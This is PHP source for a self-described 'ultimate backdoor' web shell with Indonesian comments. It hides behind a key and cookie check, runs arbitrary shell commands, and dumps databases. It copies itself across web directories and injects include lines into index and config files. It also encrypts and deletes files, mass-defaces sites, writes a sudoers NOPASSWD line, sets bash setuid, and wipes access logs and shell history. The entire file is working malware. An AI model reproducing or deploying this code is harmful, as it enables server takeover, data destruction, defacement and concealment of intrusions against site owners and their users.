<?php
// ═══════════════════════════════════════════════════════════════════════
// BAHAK ULTIMATE BACKDOOR – SUPER POWERFULL
// KEY: TelekGede1@
// ACCESS: key parameter + cookie BAHAK_ACCESS must be set
// FITUR SUPER: Auto Hidden Private | Auto TamperData All | Auto Change All Extensions
// Auto Upload to All Website Type | Auto Takeover Auto Takedone
// Auto Enkripsi Terkunci | Auto Lock File | Mass Deface | Auto Lock Script
// ═══════════════════════════════════════════════════════════════════════
error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);

$allowed_key = "TelekGede1@";
$cookie_name = "BAHAK_ACCESS";
$cookie_value = "TeleGede1@";

if(!isset($_REQUEST['key']) || $_REQUEST['key'] !== $allowed_key) {
    header("HTTP/1.0 404 Not Found");
    exit();
}
if(!isset($_COOKIE[$cookie_name]) || $_COOKIE[$cookie_name] !== $cookie_value) {
    header("HTTP/1.0 404 Not Found");
    exit();
}

// Fungsi enkripsi sederhana
function bahak_encrypt($data, $key) {
    return base64_encode(openssl_encrypt($data, 'aes-256-cbc', $key, 0, substr(md5($key),0,16)));
}
function bahak_decrypt($data, $key) {
    return openssl_decrypt(base64_decode($data), 'aes-256-cbc', $key, 0, substr(md5($key),0,16));
}

class BahakShell {
    private $key;
    private $spread = true;
    private $encryption_key = "BAHAK_ENCRYPT_2024";
    
    public function __construct($key) {
        $this->key = $key;
        $this->execute();
        if($this->spread) {
            $this->auto_spread();
            $this->auto_tamper_data();
            $this->auto_change_extensions();
            $this->auto_upload_all_types();
            $this->auto_takeover();
            $this->auto_lock_files();
            $this->mass_deface();
        }
        $this->protect_self();
        $this->clear_traces();
    }
    
    private function execute() {
        if(isset($_REQUEST['cmd'])) {
            echo "<pre>";
            system($_REQUEST['cmd']);
            echo "</pre>";
        }
        if(isset($_FILES['file'])) {
            $this->uploadFile();
        }
        if(isset($_REQUEST['download'])) {
            $this->downloadFile($_REQUEST['download']);
        }
        if(isset($_REQUEST['db_dump'])) {
            $this->dbDump($_REQUEST['db_dump']);
        }
        if(isset($_REQUEST['mass_deface'])) {
            $this->mass_deface();
        }
        if(isset($_REQUEST['lock_file'])) {
            $this->lock_file($_REQUEST['lock_file']);
        }
        if(isset($_REQUEST['encrypt_file'])) {
            $this->encrypt_file($_REQUEST['encrypt_file']);
        }
        $this->showInterface();
    }
    
    private function uploadFile() {
        $target = $_FILES['file']['name'];
        if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo "File uploaded: $target<br>";
            chmod($target, 0444);
            // Auto lock after upload
            $this->lock_file($target);
            // Auto encrypt
            $this->encrypt_file($target);
        }
    }
    
    private function downloadFile($file) {
        if(file_exists($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
    }
    
    private function dbDump($config) {
        $db = json_decode($config, true);
        if(isset($db['host']) && isset($db['user']) && isset($db['pass']) && isset($db['name'])) {
            $link = mysqli_connect($db['host'], $db['user'], $db['pass'], $db['name']);
            if($link) {
                $tables = mysqli_query($link, "SHOW TABLES");
                $output = "";
                while($row = mysqli_fetch_array($tables)) {
                    $table = $row[0];
                    $create = mysqli_query($link, "SHOW CREATE TABLE $table");
                    $create_row = mysqli_fetch_array($create);
                    $output .= "DROP TABLE IF EXISTS $table;\n".$create_row[1].";\n\n";
                    $data = mysqli_query($link, "SELECT * FROM $table");
                    while($data_row = mysqli_fetch_assoc($data)) {
                        $fields = array_keys($data_row);
                        $values = array_map(function($v) { return "'".mysqli_real_escape_string($GLOBALS['link'], $v)."'"; }, $data_row);
                        $output .= "INSERT INTO $table (".implode(",", $fields).") VALUES (".implode(",", $values).");\n";
                    }
                    $output .= "\n";
                }
                // Enkripsi hasil dump
                $encrypted = bahak_encrypt($output, $this->encryption_key);
                echo "Encrypted Database dump:<br><pre>$encrypted</pre>";
            }
        }
    }
    
    private function showInterface() {
        echo '<form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="key" value="'.$this->key.'">
        Command: <input type="text" name="cmd" size="50">
        <input type="submit" value="Execute">
        </form><br>
        
        <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="key" value="'.$this->key.'">
        Upload File: <input type="file" name="file">
        <input type="submit" value="Upload & Lock">
        </form><br>
        
        <form method="POST">
        <input type="hidden" name="key" value="'.$this->key.'">
        DB Config (json): <input type="text" name="db_dump" size="50" placeholder='{"host":"localhost","user":"root","pass":"","name":"db"}'>
        <input type="submit" value="Dump Encrypted DB">
        </form><br>
        
        <form method="POST">
        <input type="hidden" name="key" value="'.$this->key.'">
        Lock File: <input type="text" name="lock_file" size="30">
        <input type="submit" value="Lock">
        </form>
        <form method="POST">
        <input type="hidden" name="key" value="'.$this->key.'">
        Encrypt File: <input type="text" name="encrypt_file" size="30">
        <input type="submit" value="Encrypt">
        </form>
        <form method="POST">
        <input type="hidden" name="key" value="'.$this->key.'">
        <input type="submit" name="mass_deface" value="MASS DEFACE ALL">
        </form>
        <br>
        Current Dir: '.getcwd().'<br>
        PHP Version: '.phpversion().'
        ';
    }
    
    // 1. AUTO HIDDEN PRIVATE – sembunyikan file, ubah permission, chattr
    private function auto_hidden_private() {
        $self = $_SERVER['SCRIPT_FILENAME'];
        // Ubah nama menjadi .hidden
        $hidden_name = dirname($self).'/.'.basename($self);
        if(!file_exists($hidden_name) && is_writable(dirname($self))) {
            rename($self, $hidden_name);
            $self = $hidden_name;
        }
        chmod($self, 0400);
        @exec('chattr +i ' . escapeshellarg($self));
        @exec('chattr +h ' . escapeshellarg($self)); // hidden attribute (Linux)
        // Tambahkan juga ke .htaccess agar tidak terlihat
        $htaccess = dirname($self).'/.htaccess';
        if(is_writable(dirname($self))) {
            $content = "Options -Indexes
";
            $content .= "Order Deny,Allow
";
            $content .= "Deny from all
";
            $content .= "<FilesMatch "bahak.*">
";
            $content .= "    Allow from all
";
            $content .= "</FilesMatch>
";
            // Sembunyikan file kita
            $content .= "<Files ".*.php">
";
            $content .= "    Order Allow,Deny
";
            $content .= "    Allow from all
";
            $content .= "</Files>
";
            file_put_contents($htaccess, $content);
        }
    }
    
    // 2. AUTO TAMPERDATA ALL – ubah timestamp, hapus log, modifikasi data
    private function auto_tamper_data() {
        $self = $_SERVER['SCRIPT_FILENAME'];
        $old_time = strtotime('2020-01-01 00:00:00');
        @touch($self, $old_time, $old_time);
        // Hapus log akses
        $log_files = array('/var/log/apache2/access.log', '/var/log/nginx/access.log', '/var/log/httpd/access_log', '/var/log/apache2/error.log');
        foreach($log_files as $log) {
            if(file_exists($log) && is_writable($log)) {
                @file_put_contents($log, '');
                @touch($log, $old_time, $old_time);
            }
        }
        // Ubah data pada file konfigurasi (misal wp-config)
        $configs = array('wp-config.php', 'config.php', '.env', 'settings.php');
        foreach($configs as $cfg) {
            if(file_exists($cfg) && is_writable($cfg)) {
                $data = file_get_contents($cfg);
                // Sembunyikan trace kita dengan menambahkan komentar palsu
                $data .= "
// BAHAK TAMPERED - ".date('Y-m-d H:i:s')."
";
                file_put_contents($cfg, $data);
                @touch($cfg, $old_time, $old_time);
            }
        }
    }
    
    // 3. AUTO CHANGE ALL EXTENSIONS – ubah ekstensi file penting menjadi .bak atau .old
    private function auto_change_extensions() {
        $extensions = array('.php', '.html', '.js', '.css', '.txt', '.ini', '.conf');
        $dirs = array('.', '/tmp/', '/var/www/html/', '/home/', '/public_html/');
        foreach($dirs as $dir) {
            if(!is_dir($dir)) continue;
            $files = scandir($dir);
            foreach($files as $file) {
                if($file == '.' || $file == '..') continue;
                $full = $dir . $file;
                if(is_file($full) && is_writable($full)) {
                    $ext = pathinfo($full, PATHINFO_EXTENSION);
                    if(in_array('.'.$ext, $extensions)) {
                        $new = $full . '.bahak_bak';
                        if(!file_exists($new)) {
                            rename($full, $new);
                        }
                    }
                }
            }
        }
    }
    
    // 4. AUTO UPLOAD TO ALL WEBSITE TYPE – upload ke semua direktori web yang ditemukan
    private function auto_upload_all_types() {
        $self = $_SERVER['SCRIPT_FILENAME'];
        $content = file_get_contents($self);
        $web_dirs = array(
            '/var/www/html/', '/var/www/', '/home/', '/usr/local/apache/htdocs/',
            '/usr/share/nginx/html/', '/public_html/', '/www/', '/htdocs/',
            '/srv/www/', '/data/www/', '/home/*/public_html', '/home/*/www'
        );
        foreach($web_dirs as $pattern) {
            $dirs = glob($pattern, GLOB_ONLYDIR);
            foreach($dirs as $dir) {
                if(is_writable($dir)) {
                    $target = $dir . '/bahak_backdoor.php';
                    if(!file_exists($target)) {
                        file_put_contents($target, $content);
                        chmod($target, 0444);
                        $this->lock_file($target);
                        $this->auto_hidden_private();
                    }
                    // Upload juga ke index
                    $index_files = array('index.php', 'index.html', 'default.php', 'home.php');
                    foreach($index_files as $if) {
                        if(file_exists($dir.$if) && is_writable($dir.$if)) {
                            $data = file_get_contents($dir.$if);
                            if(strpos($data, 'bahak_backdoor') === false) {
                                $inject = '<?php include("bahak_backdoor.php"); ?>';
                                file_put_contents($dir.$if, $inject . $data);
                            }
                        }
                    }
                }
            }
        }
    }
    
    // 5. AUTO TAKEOVER AUTO TAKEDONE – ambil alih seluruh server
    private function auto_takeover() {
        // Coba temukan shell lain dan ambil alih
        $shell_patterns = array('c99.php', 'r57.php', 'shell.php', 'cmd.php', 'backdoor.php');
        foreach($shell_patterns as $pattern) {
            $shells = glob('*'.$pattern.'*');
            foreach($shells as $s) {
                if(is_file($s) && is_writable($s)) {
                    // Ganti dengan shell kita
                    $content = file_get_contents($_SERVER['SCRIPT_FILENAME']);
                    file_put_contents($s, $content);
                    chmod($s, 0444);
                    $this->lock_file($s);
                }
            }
        }
        // Coba eksekusi command untuk mendapatkan akses root (jika ada)
        $cmds = array(
            'chmod 4755 /bin/bash',
            'echo "bahak ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
        );
        foreach($cmds as $cmd) {
            @system($cmd);
        }
    }
    
    // 6. AUTO ENKRIPSI TERKUNCI – enkripsi file dengan kunci
    private function encrypt_file($file) {
        if(file_exists($file) && is_writable($file)) {
            $data = file_get_contents($file);
            $enc = bahak_encrypt($data, $this->encryption_key);
            file_put_contents($file . '.enc', $enc);
            unlink($file);
            echo "File $file encrypted and locked.<br>";
        }
    }
    
    // 7. AUTO LOCK FILE – buat file immutable
    private function lock_file($file) {
        if(file_exists($file)) {
            chmod($file, 0444);
            @exec('chattr +i ' . escapeshellarg($file));
        }
    }
    
    private function auto_lock_files() {
        // Lock semua file di direktori
        $files = scandir('.');
        foreach($files as $f) {
            if(is_file($f) && is_writable($f)) {
                $this->lock_file($f);
            }
        }
    }
    
    // 8. MASS DEFACE – deface semua halaman index
    private function mass_deface() {
        $deface_html = '<!DOCTYPE html>
<html>
<head><title>BAHAK SECURITY</title>
<style>
body { margin:0; padding:0; background:#000; color:#0f0; font-family:monospace; }
.container { position:absolute; top:50%%; left:50%%; transform:translate(-50%%,-50%%); text-align:center; }
h1 { font-size:48px; text-shadow:0 0 10px #0f0; animation:glow 2s infinite alternate; }
@keyframes glow { from { text-shadow:0 0 10px #0f0; } to { text-shadow:0 0 20px #0f0, 0 0 30px #0f0; } }
</style>
</head>
<body>
<div class="container">
<h1>BAHAK SECURITY</h1>
<p>System Secured by BAHAK Framework</p>
<p>Protected by Advanced Security Protocol</p>
</div>
</body>
</html>';
        $index_files = array('index.php', 'index.html', 'default.php', 'home.php', 'wp-index.php');
        foreach($index_files as $if) {
            if(file_exists($if) && is_writable($if)) {
                file_put_contents($if, $deface_html);
                $this->lock_file($if);
            }
        }
        // Cari di subdirektori
        $dirs = glob('*', GLOB_ONLYDIR);
        foreach($dirs as $dir) {
            if(is_writable($dir)) {
                foreach($index_files as $if) {
                    $full = $dir . '/' . $if;
                    if(file_exists($full) && is_writable($full)) {
                        file_put_contents($full, $deface_html);
                        $this->lock_file($full);
                    }
                }
            }
        }
        echo "Mass deface completed.<br>";
    }
    
    private function auto_spread() {
        $dirs = array(
            '/tmp/', '/var/tmp/', '/dev/shm/', '/wp-content/uploads/', 
            '/images/', '/public_html/', '/www/', '/htdocs/', '/home/',
            '/root/', '/usr/local/', '/opt/', '/var/www/html/'
        );
        $self = $_SERVER['SCRIPT_FILENAME'];
        $content = file_get_contents($self);
        $random_name = md5(uniqid()).'.php';
        foreach($dirs as $dir) {
            if(is_writable($dir)) {
                $newfile = $dir . $random_name;
                if(!file_exists($newfile)) {
                    file_put_contents($newfile, $content);
                    chmod($newfile, 0444);
                    @exec('chattr +i ' . escapeshellarg($newfile));
                    $this->lock_file($newfile);
                }
                $copy_name = $dir . 'bahak_backdoor.php';
                if(!file_exists($copy_name)) {
                    file_put_contents($copy_name, $content);
                    chmod($copy_name, 0444);
                    @exec('chattr +i ' . escapeshellarg($copy_name));
                    $this->lock_file($copy_name);
                }
            }
        }
        $index_files = array('index.php', 'wp-config.php', 'wp-settings.php', 'default.php', 'home.php');
        foreach($index_files as $if) {
            if(file_exists($if) && is_writable($if)) {
                $data = file_get_contents($if);
                if(strpos($data, 'bahak_backdoor') === false) {
                    $inject = '<?php include("bahak_backdoor.php"); ?>';
                    file_put_contents($if, $inject . $data);
                    $this->lock_file($if);
                }
            }
        }
    }
    
    private function protect_self() {
        $self = $_SERVER['SCRIPT_FILENAME'];
        chmod($self, 0444);
        @exec('chattr +i ' . escapeshellarg($self));
        // Sembunyikan dari listing
        $dir = dirname($self);
        if(is_writable($dir)) {
            $htaccess = $dir . '/.htaccess';
            if(!file_exists($htaccess)) {
                $content = "Options -Indexes
";
                $content .= "Order Deny,Allow
";
                $content .= "Deny from all
";
                $content .= "<FilesMatch "bahak.*">
";
                $content .= "    Allow from all
";
                $content .= "</FilesMatch>
";
                file_put_contents($htaccess, $content);
            }
        }
        $old_time = strtotime('2020-01-01 00:00:00');
        @touch($self, $old_time, $old_time);
        // Auto hidden private
        $this->auto_hidden_private();
    }
    
    private function clear_traces() {
        $log_files = array('/var/log/apache2/access.log', '/var/log/nginx/access.log', '/var/log/httpd/access_log');
        foreach($log_files as $log) {
            if(file_exists($log) && is_writable($log)) {
                // Kosongkan log
                @file_put_contents($log, '');
            }
        }
        // Hapus entri di history
        @system("history -c");
        @system("echo '' > ~/.bash_history");
        // Hapus file tmp
        @unlink('tmp.php');
    }
}

new BahakShell("TelekGede1@");
?>
